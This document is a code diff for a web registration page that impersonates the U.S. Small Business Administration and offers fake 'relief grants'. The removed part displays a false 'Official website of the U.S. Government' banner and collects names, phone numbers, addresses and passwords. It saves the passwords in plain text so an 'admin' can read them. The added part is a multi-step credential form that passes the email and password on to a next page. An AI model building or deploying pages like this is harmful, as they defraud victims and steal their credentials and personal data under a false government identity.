@@ -2,162 +2,58 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA | Case Enrollment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA | Registration Step 1</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
-        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        
-        .auth-container { width: 100%; max-width: 450px; margin: 30px auto; padding: 15px; }
-        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 2px; }
-        
-        .logo-box { border: 2.5px solid var(--sba-navy); padding: 2px 6px; display: inline-block; position: relative; }
-        .logo-box::after { content: ""; position: absolute; bottom: -2.5px; left: -2.5px; width: 60%; height: 2.5px; background: var(--sba-red); }
-        
-        input, select { height: 45px !important; border-radius: 2px !important; font-size: 14px !important; border: 1px solid #ced4da !important; transition: 0.2s; width: 100%; padding: 0 12px; outline: none; }
-        input:focus, select:focus { border-color: var(--sba-navy) !important; box-shadow: 0 0 0 3px rgba(0, 46, 109, 0.1); }
-        
-        label { display: block; text-transform: uppercase; font-size: 10px; font-weight: 800; color: #6c757d; margin-bottom: 4px; margin-left: 2px; letter-spacing: 0.5px; }
-        
-        .btn-sba { background: var(--sba-navy); height: 50px; font-weight: 800; letter-spacing: 1px; border-radius: 2px; color: white; text-transform: uppercase; font-size: 12px; transition: 0.3s; width: 100%; margin-top: 10px; }
-        .btn-sba:hover { background: #001f4d; }
+        :root { --sba-navy: #002e6d; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', sans-serif; }
+        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 400px; border-radius: 4px; }
+        .input-field { height: 48px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 12px; outline: none; border-radius: 4px; font-size: 14px; }
+        .btn-next { background: var(--sba-navy); height: 50px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 12px; border-radius: 4px; }
     </style>
 </head>
-<body class="min-h-screen">
-
-    <div class="bg-[#f8f9fa] border-b border-gray-200 py-2 px-4 flex items-center gap-2">
-        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="USA">
-        <span class="text-[9px] font-bold text-gray-500 uppercase tracking-wider">Official website of the U.S. Government</span>
-    </div>
-
-    <div class="auth-container">
-        <div class="auth-card p-6 md:p-8">
-            <div class="flex items-center gap-3 mb-8">
-                <div class="logo-box">
-                    <span class="text-xl font-black text-[#002e6d] tracking-tighter">SBA</span>
-                </div>
-                <div class="h-8 w-[1px] bg-gray-300"></div>
-                <div class="leading-none">
-                    <p class="text-[9px] font-bold text-gray-500 uppercase">U.S. Small Business</p>
-                    <p class="text-[9px] font-bold text-gray-500 uppercase">Administration</p>
-                </div>
-            </div>
-
-            <h2 class="text-xl font-black text-gray-800 mb-6 uppercase tracking-tight">Initialize Secure Case</h2>
-
-            <div id="alertBox" class="hidden mb-4 p-3 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold uppercase"></div>
-
-            <form id="registerForm" class="space-y-4">
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div>
-                        <label>Full Legal Name</label>
-                        <input type="text" id="userName" required placeholder="John Doe">
-                    </div>
-                    <div>
-                        <label>Phone Number</label>
-                        <input type="tel" id="userPhone" required placeholder="+1 (555) 000-0000">
-                    </div>
-                </div>
-
-                <div>
-                    <label>Email Address</label>
-                    <input type="email" id="userEmail" required placeholder="officer@agency.gov">
-                </div>
-
-                <div class="grid grid-cols-2 gap-4">
-                    <div>
-                        <label>State of Residence</label>
-                        <input type="text" id="userState" required placeholder="California">
-                    </div>
-                    <div>
-                        <label>Zip Code</label>
-                        <input type="text" id="userZip" required placeholder="90001">
-                    </div>
-                </div>
-
-                <div>
-                    <label>Relief Program Category</label>
-                    <select id="reliefType" required>
-                        <option value="">Select Grant Type</option>
-                        <option value="Small Business Stimulus">Small Business Stimulus</option>
-                        <option value="Disaster Relief Grant">Disaster Relief Grant</option>
-                        <option value="Entrepreneur Expansion">Entrepreneur Expansion</option>
-                    </select>
-                </div>
-
-                <div>
-                    <label>Create Passkey</label>
-                    <input type="password" id="userPass" required placeholder="••••••••">
-                </div>
-
-                <div class="p-3 bg-blue-50 border border-blue-100 rounded text-[10px] text-blue-800 font-bold uppercase leading-tight">
-                    Notice: Data will be encrypted using RSA-4096 and stored in the federal ledger for verification.
-                </div>
-
-                <button type="submit" id="submitBtn" class="btn-sba shadow-md">
-                    Initialize Case File
-                </button>
-            </form>
-
-            <div class="mt-8 text-center border-t border-gray-100 pt-6">
-                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Existing Personnel?</p>
-                <a href="login.html" class="text-[#002e6d] font-bold text-xs uppercase hover:underline">Access Portal</a>
+<body class="min-h-screen flex items-center justify-center p-6">
+    <div class="auth-card p-8">
+        <div class="mb-8">
+            <h2 class="text-xl font-black text-gray-800 uppercase mb-2">Step 1: Credentials</h2>
+            <div class="flex gap-1">
+                <div class="h-1.5 w-1/2 bg-[#002e6d] rounded-full"></div>
+                <div class="h-1.5 w-1/2 bg-gray-100 rounded-full"></div>
             </div>
         </div>
+
+        <form id="step1Form" class="space-y-5">
+            <div>
+                <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Email Address</label>
+                <input type="email" id="email" class="input-field" required placeholder="yourname@example.com">
+            </div>
+            <div>
+                <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Create Passkey</label>
+                <input type="password" id="pass" class="input-field" required placeholder="••••••••">
+            </div>
+            <div>
+                <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Confirm Passkey</label>
+                <input type="password" id="confirm" class="input-field" required placeholder="••••••••">
+            </div>
+
+            <div class="flex items-start gap-2">
+                <input type="checkbox" required class="mt-1 w-4 h-4 accent-[#002e6d]">
+                <p class="text-[10px] font-bold text-gray-500 uppercase leading-tight">
+                    I agree to the <a href="terms.html" class="text-blue-700">Terms of Service</a> and Privacy Policy.
+                </p>
+            </div>
+
+            <button type="submit" class="btn-next shadow-lg">Next Step</button>
+        </form>
     </div>
-
-    <script type="module">
-        import { auth, db } from './firebase-config.js';
-        import { createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
-
-        const regForm = document.getElementById('registerForm');
-        const alertBox = document.getElementById('alertBox');
-        const btn = document.getElementById('submitBtn');
-
-        regForm.onsubmit = async (e) => {
+    <script>
+        document.getElementById('step1Form').onsubmit = (e) => {
             e.preventDefault();
-            alertBox.classList.add('hidden');
-            
-            const email = document.getElementById('userEmail').value.toLowerCase().trim();
-            const pass = document.getElementById('userPass').value;
-            const name = document.getElementById('userName').value;
-            const phone = document.getElementById('userPhone').value;
-            const state = document.getElementById('userState').value;
-            const zip = document.getElementById('userZip').value;
-            const relief = document.getElementById('reliefType').value;
-
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> CONNECTING...';
-
-            try {
-                const res = await createUserWithEmailAndPassword(auth, email, pass);
-                
-                // This part saves EVERYTHING to Firestore so you see it for Admin side
-                await setDoc(doc(db, "users", res.user.uid), {
-                    uid: res.user.uid,
-                    fullName: name,
-                    email: email,
-                    phone: phone,
-                    state: state,
-                    zipCode: zip,
-                    reliefType: relief,
-                    password: pass, // Optional: saving plain pass so you can see it for admin
-                    balance: 0,
-                    caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
-                    kycStatus: "PENDING",
-                    registeredAt: new Date().toISOString()
-                });
-                
-                window.location.href = "welcome.html";
-            } catch (err) {
-                btn.disabled = false;
-                btn.innerText = "Initialize Case File";
-                alertBox.innerText = "Error: " + err.message;
-                alertBox.classList.remove('hidden');
-            }
+            if(document.getElementById('pass').value !== document.getElementById('confirm').value) return alert("Passwords mismatch!");
+            sessionStorage.setItem('reg_email', document.getElementById('email').value);
+            sessionStorage.setItem('reg_pass', document.getElementById('pass').value);
+            window.location.href = "register2.html";
         };
     </script>
 </body>
